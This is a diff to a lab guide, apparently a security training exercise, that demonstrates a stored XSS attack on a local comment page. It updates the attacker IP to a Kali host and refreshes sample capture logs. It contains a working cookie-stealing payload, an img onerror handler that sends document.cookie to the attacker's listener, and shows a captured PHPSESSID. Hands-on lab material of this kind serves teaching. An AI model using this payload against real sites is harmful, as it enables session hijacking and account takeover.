@@ -51,7 +51,7 @@ Find your machine's IP (you'll need it for the payload):
 hostname -I        # Linux
 ipconfig           # Windows (look for IPv4 Address)
 ```
-Example IP used below: `192.168.1.10`
+Example IP used below: `10.0.2.3` (this lab's Kali attacker)
 
 ---
 
@@ -71,10 +71,10 @@ Example IP used below: `192.168.1.10`
 ## 3. Inject the XSS payload (the attack)
 
 In the comment box on **http://localhost:8001**, paste this — replacing
-`192.168.1.10` with **your** IP from step 1:
+`10.0.2.3` with **your** Kali IP from step 1:
 
 ```html
-<img src=x onerror="this.src='http://192.168.1.10:8080/?c='+document.cookie">
+<img src=x onerror="this.src='http://10.0.2.3:8080/?c='+document.cookie">
 ```
 
 Click **Submit**, then **reload the page** so the stored payload executes.
@@ -92,16 +92,16 @@ Open the **CookieCatcher dashboard**: **http://localhost:8080**
 
 You'll see an entry like:
 ```
-[2024-01-15 14:45:03] IP 192.168.1.20
-UA: Mozilla/5.0 ... Chrome/120.0
+[2026-05-31 14:45:03] IP 10.0.2.15
+UA: Mozilla/5.0 ... (Win 7) ...
 COOKIE: PHPSESSID=abc123xyz789; user_id=12345
 ```
 
 The terminal running CookieCatcher also prints:
 ```
 === COOKIE CAPTURED ===
-TIME        : 2024-01-15 14:45:03
-SOURCE_IP   : 192.168.1.20
+TIME        : 2026-05-31 14:45:03
+SOURCE_IP   : 10.0.2.15
 COOKIE      : PHPSESSID=abc123xyz789; user_id=12345
 =======================
 ```
